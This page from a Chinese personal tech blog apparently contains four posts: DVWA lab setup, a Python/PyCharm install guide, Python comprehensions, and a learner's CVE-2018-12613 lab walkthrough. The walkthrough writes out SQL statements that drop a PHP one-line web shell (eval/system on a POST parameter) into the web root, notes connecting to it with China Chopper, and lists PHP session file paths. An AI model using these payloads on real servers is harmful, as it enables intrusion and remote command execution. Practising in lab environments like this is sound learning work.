    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>DVWA是一个学习Web漏洞的很好的工具，一个基于PHP/MYSQL环境写的一个web应用。如果你想学习web渗透测试测试遇见DVWA是你的幸运。DVWA包括<strong>Brute Force（暴力（破解））、Command Injection（命令行注入）、CSRF（跨站请求伪造）、File Inclusion（文件包含）、File Upload（文件上传）、Insecure CAPTCHA（不安全的验证码）、SQL Injection（SQL注入）、SQL Injection（Blind）（SQL盲注）、Weak Session IDs（弱会话标识）、XSS（DOM）（文档对象模型跨站脚本）、XSS（Reflected）（反射型跨站脚本）、XSS（Stored）（存储型跨站脚本）、JavaScript等漏洞。</strong>并且每一种漏洞还分了四种不同级别，在实验中还可以对照不同的等级来比较不同的PHP代码，给出的代码能我们更好的了解相应攻击方式的防御机制。</p>
</blockquote>
<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>DVWA：链接：<a href="https://pan.baidu.com/s/1RBYwv1X6zmh-25yCfQF9lA" target="_blank" rel="noopener">https://pan.baidu.com/s/1RBYwv1X6zmh-25yCfQF9lA </a><br>提取码：wm9r<br>phpstudy：<a href="http://www.phpstudy.net/" target="_blank" rel="noopener">http://www.phpstudy.net/ </a></p>
<h1 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h1><p>下载的步骤比较简单，下载好后，解压<strong>PHP study</strong>和<strong>DVWA</strong>，这两个步骤也比较简单，注意PHP study的路径不能有中文，安装好后就可以看到PHP study的主页面如下图：<br><img src="https://i.loli.net/2019/03/29/5c9daa8c70327.png" alt=""><br>之后找到<strong>PHP study</strong>根目录下的<strong>www</strong>目录，如下图：<br><img src="https://i.loli.net/2019/03/29/5c9dab87a5ae9.png" alt=""></p>
<p>在这里找到根目录后，把解压好的DVWA文件放在<strong>www</strong>目录下，如下图<br><img src="https://i.loli.net/2019/03/29/5c9dae1644382.png" alt=""><br>并且要把文件名改成<strong>DVWA</strong>。<br><img src="https://i.loli.net/2019/03/29/5c9dae8d9ca05.png" alt=""><br>接着用记事本打开DVWA/config/config.inc.php文件。<br><img src="https://i.loli.net/2019/03/29/5c9daeeb22523.png" alt=""><br>保存修改之后把文件的后缀去掉，如图<br><img src="https://i.loli.net/2019/03/29/5c9daf4b95f93.png" alt=""><br>做完这些环境设置就已经完成了，就可以启动<strong>PHP study</strong>并在浏览器上进入<strong>DVWA</strong>网站，链接：<a href="http://localhost/dvwa/setup.php" target="_blank" rel="noopener">http://localhost/dvwa/setup.php</a></p>
<h1 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h1><p>进入网站之后会显示这个页面，直接跳过就会出现登陆界面<br><img src="https://i.loli.net/2019/03/29/5c9db186b11e7.png" alt=""><br><img src="https://i.loli.net/2019/03/29/5c9db25f33d79.png" alt=""><br>这里是默认的密码。<br><img src="https://i.loli.net/2019/03/29/5c9db3fc43bc9.png" alt=""><br>到这里，整个DVWA的环境已经搭建完毕。</p>
<h1 id="END！"><a href="#END！" class="headerlink" title="END！"></a>END！</h1>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
	</div>

      

      
        
<div class="counter-tag counter">
    <span id="/2019/03/28/DVWA漏洞靶机环境搭建/" class="leancloud_visitors post-title-link" style="font-size: 12px" data-flag-title="DVWA漏洞靶机环境搭建">
         &nbsp;
        view
    </span>
</div>

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-pycham搭建python程序运行环境" class="article article-type-post" itemscope="" itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/03/27/pycham搭建python程序运行环境/" class="article-date">
  	<time datetime="2019-03-27T11:03:23.000Z" itemprop="datePublished">2019-03-27</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/27/pycham搭建python程序运行环境/">
        pycharm搭建python程序运行环境
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文写的是在Windows系统下安装python和pycharm，并完成正常的python的代码的执行，即简单的python运行环境。</p>
<blockquote>
<p>PyCharm是一种Python IDE，带有一整套可以帮助用户在使用Python语言开发时提高其效率的工具，比如调试、语法高亮、Project管理、代码跳转、智能提示、自动完成、单元测试、版本控制。此外，该IDE提供了一些高级功能，以用于支持Django框架下的专业Web开发。</p>
</blockquote>
<h1 id="下载安装python"><a href="#下载安装python" class="headerlink" title="下载安装python"></a>下载安装python</h1><p><strong>python官网链接：<a href="https://www.python.org/" target="_blank" rel="noopener">https://www.python.org/</a></strong><br><img src="https://i.loli.net/2019/03/27/5c9b5969d3f3d.png" alt=""><br>  推荐安装python3.0以上版本，进入链接之后，选择自己的操作系统和要下载的python版本，下载过程中记得点击添加系统环境变量，如下图：<br><img src="https://i.loli.net/2019/03/27/5c9b5b4ce822f.png" alt=""><br>之后就可以一直next，然后在cmd中输入<code>python</code>，如果出现下图，即代表安装成功。<br><img src="https://i.loli.net/2019/03/27/5c9b5bd6b42f0.png" alt=""></p>
<h1 id="pycharm的安装"><a href="#pycharm的安装" class="headerlink" title="pycharm的安装"></a>pycharm的安装</h1><p><strong>pycharm官网链接：<a href="http://www.jetbrains.com/pycharm/download/#section=windows" target="_blank" rel="noopener">http://www.jetbrains.com/pycharm/download/#section=windows</a></strong></p>
<p>进去网站之后，会看到下面的界面：<br><img src="https://i.loli.net/2019/03/27/5c9b5c30490fa.png" alt=""><br>推荐下载使用社区版的，社区版的自己使用足够了，并且是免费的，如果下载专业版的只能使用三十天，试用结束之后还要重新下载或者选择购买。下载之后点击运行软件，看到以下界面：<br><img src="https://i.loli.net/2019/03/27/5c9b5c30918f4.png" alt=""><br>然后<br><img src="https://i.loli.net/2019/03/27/5c9b5c30b3542.png" alt=""><br>这里记得改安装路径，接下来是<br><img src="https://i.loli.net/2019/03/27/5c9b5e9ebd030.png" alt=""><br>根据自己的电脑选择32位还是64位，目前应该基本都是64位系统的，选择好之后点next<br><img src="https://i.loli.net/2019/03/27/5c9b5ee58193d.png" alt=""><br>看到这个页面点击install（安装）<br><img src="https://i.loli.net/2019/03/27/5c9b5f27bc604.png" alt=""><br>看到这个页面我们的pycharm就已经安装成功了。</p>
<h1 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h1><p>首先运行pycharn，看到以下界面：<br><img src="https://i.loli.net/2019/03/27/5c9b5fa6aba05.png" alt=""><br>点击<strong>create new probject</strong><br><img src="https://i.loli.net/2019/03/27/5c9b5fe5eea7e.png" alt=""><br>这里是我们存代码的目录，尽量填写简短一点，填写之后，点击<strong>create</strong>，就可以看到pycharm的主页面，然后我们点击<strong>file-&gt;settings</strong>,看到下图<br><img src="https://i.loli.net/2019/03/27/5c9b60ec9d2fa.png" alt=""><br><img src="https://i.loli.net/2019/03/27/5c9b606516a92.png" alt=""><br>如上图所示找到你的python安装路径<br><img src="https://i.loli.net/2019/03/27/5c9b61d625a53.png" alt=""><br>如果需要安装模块，可以点击如图所示的＋号<br><img src="https://i.loli.net/2019/03/27/5c9b620e8d18f.png" alt=""><br>在这里搜索需要安装的模块，点击下方的安装就可以了，我们在这里安装一个<strong>pymysql</strong>，等待一会就安装成功了，接下来就可以开始愉快的打代码了！</p>
<h1 id="创建-py文件"><a href="#创建-py文件" class="headerlink" title="创建.py文件"></a>创建.py文件</h1><p>回到主页面<br><img src="https://i.loli.net/2019/03/27/5c9b63e0bb2c8.png" alt=""><br>如图，创建一个.py文件，<br><img src="https://i.loli.net/2019/03/27/5c9b642271462.png" alt=""><br>输入文件名之后，系统会自动生成，之后就可以打代码了<br><img src="https://i.loli.net/2019/03/27/5c9b6431188d6.png" alt=""><br>打完代码之后，右键点击<strong>run ‘文件名’</strong>就可以跑起来程序了。</p>
<h2 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h2><blockquote>
<p>比较常用的快捷键：<br>Ctrl + Alt + I    自动缩进<br>Tab / Shift + Tab  缩进、不缩进当前行<br>Ctrl + D  复制选定的区域或行<br>Ctrl + Y    删除选定的行<br>Shift + Enter    另起一行<br>Ctrl + Shift + R   全局替换<br>Shift + F10    运行</p>
</blockquote>
<h1 id="END"><a href="#END" class="headerlink" title="END!"></a>END!</h1>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python环境搭建/">python环境搭建</a></li></ul>
	</div>

      

      
        
<div class="counter-tag counter">
    <span id="/2019/03/27/pycham搭建python程序运行环境/" class="leancloud_visitors post-title-link" style="font-size: 12px" data-flag-title="pycharm搭建python程序运行环境">
         &nbsp;
        view
    </span>
</div>

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-cve漏洞复现" class="article article-type-post" itemscope="" itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/03/27/cve漏洞复现/" class="article-date">
  	<time datetime="2019-03-27T02:18:10.000Z" itemprop="datePublished">2019-03-27</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/27/cve漏洞复现/">
        CVE-2018-12613漏洞复现
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>第一次认真的玩漏洞，感觉比平时学习学的快了好多，虽然好多都是借鉴的别人的，但自己也从中学到了很多，找到了其中的乐趣。</strong></p>
<h1 id="靶机链接"><a href="#靶机链接" class="headerlink" title="靶机链接"></a>靶机链接</h1><p><a href="https://www.mozhe.cn/bug/detail/RDM4VFA0aHFWT25Na09mdmhqcklxdz09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/RDM4VFA0aHFWT25Na09mdmhqcklxdz09bW96aGUmozhe</a></p>
<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><p>  因为是第一次做这样的题，看了两个小时一直是一脸懵逼，研究了一会之后就没有了兴趣，就迫不及待的去看别人的解题思路，对于我这种还没有学过sql注入的，看了一下别人的解题思路依旧是一脸懵逼，因此只能去百度了一下数据库的常用命令。首先我通过命令<br><em>数据库命令：<a href="http://blog.sina.com.cn/s/blog_4c197d420101aywx.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_4c197d420101aywx.html</a></em></p>
<blockquote>
<p>show variables like ‘datadir’<br>即查看数据库的物理路径，通过这个命令返回了一个路径，如下图：</p>
</blockquote>
<p><img src="https://i.loli.net/2019/03/26/5c9a1fa5933a4.png" alt=""></p>
<p>  通过得到的路径，我们可以知道这个是Linux上的，在Linux上网站的默认目录是<strong>/var/www/html/</strong>，因此就可以用一句话木马注入：</p>
<blockquote>
<p>Select “&lt;?php @eval($_POST[password]);?&gt;” INTO OUTFILE “/&gt;var/www/html/password.php”</p>
</blockquote>
<p><img src="https://i.loli.net/2019/03/26/5c9a27f503b54.png" alt=""><br>显示如图所示，表示注入成功。</p>
<h2 id="菜刀"><a href="#菜刀" class="headerlink" title="菜刀"></a>菜刀</h2><p>注入成功之后就可以使用菜刀连接，如图所示：<br><img src="https://i.loli.net/2019/03/26/5c9a297866139.png" alt=""></p>
<p><strong>注意箭头所指的地方是自己注入的时候所用的文件名和密码！</strong></p>
<p>  添加成功之后就可以在目录下找到key.txt:<br><img src="https://i.loli.net/2019/03/26/5c9a2a3764bbe.png" alt=""></p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>SQL写一句话（MySQL）</p>
<blockquote>
<p>select “&lt;?php @system($_POST[“password”]);?&gt;” into outfile “/file.php”<br>前面是一句话内容,password为连接菜刀密码，后面是绝对路径www下的PHP文件，，即注入路径file.php文件名可以随便填写。</p>
</blockquote>
<h3 id="sessionID文件常见路径"><a href="#sessionID文件常见路径" class="headerlink" title="sessionID文件常见路径"></a>sessionID文件常见路径</h3><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><blockquote>
<p>常见的文件路径为： /var/lib/php/session/</p>
</blockquote>
<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><blockquote>
<p>phpstudy集成软件环境下，文件路径为：<br>/phpstudy/PHPTutorial/tmp/tmp<br>Wamp集成软件环境下，文件路径为：<br>/wamp64/tmp”</p>
</blockquote>
<h1 id="END"><a href="#END" class="headerlink" title="END!"></a>END!</h1>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
        
<div class="counter-tag counter">
    <span id="/2019/03/27/cve漏洞复现/" class="leancloud_visitors post-title-link" style="font-size: 12px" data-flag-title="CVE-2018-12613漏洞复现">
         &nbsp;
        view
    </span>
</div>

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-python字典，数组推导式" class="article article-type-post" itemscope="" itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/03/26/python字典，数组推导式/" class="article-date">
  	<time datetime="2019-03-26T02:19:53.000Z" itemprop="datePublished">2019-03-26</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/26/python字典，数组推导式/">
        python的列表推导式，字典推导式和三元运算符
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="列表推导式"><a href="#列表推导式" class="headerlink" title="列表推导式"></a>列表推导式</h1><p>在python中，生成列表的方式有很多，今天我们来说一下用列表推导式生成列表，用列表推导式可以快速的生成一个列表，并且代码比较简洁，再说点其中的好处就是，可以用来装**，哈哈，自己脑补！我们来说一下列表推导式的简单的用法。</p>
<p><strong>列表推导式：帮助我们快速生成包含一堆数据的列表</strong></p>
<h2 id="1，快速生成一段连续的数字"><a href="#1，快速生成一段连续的数字" class="headerlink" title="1，快速生成一段连续的数字"></a>1，快速生成一段连续的数字</h2><blockquote>
<p>[i for i in range(10)]<br>[0,1,2,3,4,5,6,7,8,9]</p>
</blockquote>
<h2 id="2-可以在一些字符串中填入字符"><a href="#2-可以在一些字符串中填入字符" class="headerlink" title="2,可以在一些字符串中填入字符"></a>2,可以在一些字符串中填入字符</h2><blockquote>
<p>[“10月{}日”，format（i）for i in range(1,5)]<br>[“10月1日”,”10月2日”,”10月3日”,”10月4日”]<br><strong>注意不包含10月5日</strong></p>
</blockquote>
<p>这些方法只是其中的一些小方法，大家使用熟练之后发现许多地方多可以用的到的，并且在使用的时候还可以嵌套使用的。</p>
<h1 id="字典推导式"><a href="#字典推导式" class="headerlink" title="字典推导式"></a>字典推导式</h1><p><strong>字典推导式：帮助我们快速生成一堆数据的字典</strong></p>
<blockquote>
<p>{i:i for i in range(10)}<br>{0,1,2,3,4,5,6,7,8,9}<br>{“a{}”.format(i):10 for i in range(3)}<br>{“a0”:10,”a1”:10,”a3”:10}<br><strong>字典推导式的用法基本上和列表推导式是相同的！</strong></p>
</blockquote>
<h1 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h1><p><strong>三元运算符：即if后面的条件成立，就把if前面的结果赋值给前面的变量，否则把else后面的结果赋值给变量。</strong></p>
<h3 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h3><blockquote>
<p>a=10 if 4&gt;3 else 20<br>a=10</p>
</blockquote>
<blockquote>
<p>a=10 if 4&lt;3 else 20<br>a=20</p>
</blockquote>
<h1 id="END"><a href="#END" class="headerlink" title="END!"></a>END!</h1>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
        
<div class="counter-tag counter">
    <span id="/2019/03/26/python字典，数组推导式/" class="leancloud_visitors post-title-link" style="font-size: 12px" data-flag-title="python的列表推导式，字典推导式和三元运算符">
         &nbsp;
        view
    </span>
</div>

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2019 崔强
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">


<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: true
	}
</script>
<script src="/js/main.js"></script>



<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
</body>
</html>